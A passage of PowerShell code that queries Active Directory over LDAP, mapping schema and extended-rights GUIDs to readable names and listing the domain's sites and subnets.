    $rootDSE = New-Object System.DirectoryServices.DirectoryEntry($ldapPathRootDSE)
    $schemaNC = $rootDSE.Properties["schemaNamingContext"].Value
    $configNC = $rootDSE.Properties["configurationNamingContext"].Value

    # Construct schema path
    $ldapPathSchemaNC = "LDAP://"
    if ($PSBoundParameters.ContainsKey('Server')) {
        $ldapPathSchemaNC += "$Server/"
    }
    $ldapPathSchemaNC += "$Domain/$schemaNC"

    # Construct Extended Rights path
    $ldapPathExtendedRights = "LDAP://"
    if ($PSBoundParameters.ContainsKey('Server')) {
        $ldapPathExtendedRights += "$Server/"
    }
    $ldapPathExtendedRights += "$Domain/CN=Extended-Rights,$configNC"

    # Query schema container for schemaIDGUIDs
    $searchRootSchema = New-Object System.DirectoryServices.DirectoryEntry($ldapPathSchemaNC)
    $searcherSchema = New-Object System.DirectoryServices.DirectorySearcher($searchRootSchema)
    $searcherSchema.Filter = "(schemaIDGUID=*)"
    $searcherSchema.PropertiesToLoad.Add("name") > $null
    $searcherSchema.PropertiesToLoad.Add("schemaIDGUID") > $null
    $searcherSchema.PageSize = 1000

    # Perform the schema search
    $resultsSchema = $searcherSchema.FindAll()
    foreach ($result in $resultsSchema) {
        $name = $result.Properties["name"][0]
        $guidBytes = $result.Properties["schemaIDGUID"][0]
        $guid = New-Object Guid (,$guidBytes)  # Correct byte order conversion
        $guidMap[$guid] = $name
    }

    # Query Extended Rights container for rightsGuid
    $searchRootExtRights = New-Object System.DirectoryServices.DirectoryEntry($ldapPathExtendedRights)
    $searcherExtRights = New-Object System.DirectoryServices.DirectorySearcher($searchRootExtRights)
    $searcherExtRights.Filter = "(rightsGuid=*)"
    $searcherExtRights.PropertiesToLoad.Add("displayName") > $null
    $searcherExtRights.PropertiesToLoad.Add("rightsGuid") > $null
    $searcherExtRights.PageSize = 1000

    # Perform the Extended Rights search
    $resultsExtRights = $searcherExtRights.FindAll()
    foreach ($result in $resultsExtRights) {
        $displayName = $result.Properties["displayName"][0]
        $rightsGuidBytes = $result.Properties["rightsGuid"][0]
        $rightsGuid = New-Object Guid (,$rightsGuidBytes)
        $guidMap[$rightsGuid] = $displayName
    }

    # Clean up resources
    $searcherSchema.Dispose()
    $searcherExtRights.Dispose()
    $rootDSE.Close()
    $searchRootSchema.Close()
    $searchRootExtRights.Close()

    return $guidMap
}

Function Subnets{
    param(

        [Parameter(Mandatory = $true)]
        [string] $Domain
    )
	$DomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$Domain/RootDSE"
	$SearchPath = "LDAP://CN=Subnets,CN=Sites," + $DomainRootDSE.configurationNamingContext
	$objSearchPath = New-Object System.DirectoryServices.DirectoryEntry $SearchPath
	$objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
	$ObjSearcher.Filter = "(objectClass=subnet)"
	$ObjSearcher.SearchScope = "Subtree"
	$OurSubnets = $ObjSearcher.FindAll()
	$ObjSearcher.dispose()
	if($OurSubnets){
		$FinalSubnets = @()
		foreach ($subnet in $OurSubnets) {
			
			$Site = ($subnet.Properties.siteobject[0] -Split ",")[0] -replace 'CN=', ''
			$Name = $subnet.Properties.name[0]
			$Description = $subnet.Properties.description[0]
			
            $Obj = New-Object PSObject
			$Obj | Add-Member -MemberType NoteProperty -Name "Domain" -Value $Domain
            $Obj | Add-Member -MemberType NoteProperty -Name "Site" -Value $Site
            $Obj | Add-Member -MemberType NoteProperty -Name "Subnet" -Value $Name
            $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $Description
            $FinalSubnets += $Obj
        }
	}
    if($FinalSubnets){Return $FinalSubnets}
    else{return $null}
}
